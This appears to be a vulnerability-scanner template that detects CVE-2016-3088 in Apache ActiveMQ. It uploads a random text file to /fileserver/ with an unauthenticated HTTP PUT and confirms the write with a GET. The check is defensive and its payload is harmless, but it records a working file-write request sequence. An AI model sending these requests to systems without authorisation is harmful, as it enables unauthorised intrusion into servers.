[info]
author = "AVE"
description = "通过HTTP PUT向/fileserver/上传文件，再通过GET验证文件是否写入成功，检测Apache ActiveMQ Fileserver未授权文件上传漏洞"
id = "POC-AVE-2016-0206"
name = "Apache ActiveMQ Fileserver Arbitrary File Write PoC"
severity = "critical"
tags = [
    "cve-2016-3088",
    "activemq",
    "file-upload",
]
vuln_id = [
    "CVE-2016-3088",
    "AVE-2016-0206",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PUT"
path = "/{{BaseURL}}/fileserver/{{randstr}}.txt"
protocol = "http"

[poc.requests.body]
content = "{{rand1}}"
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    201,
    204,
]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/fileserver/{{randstr}}.txt"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["{{rand1}}"]
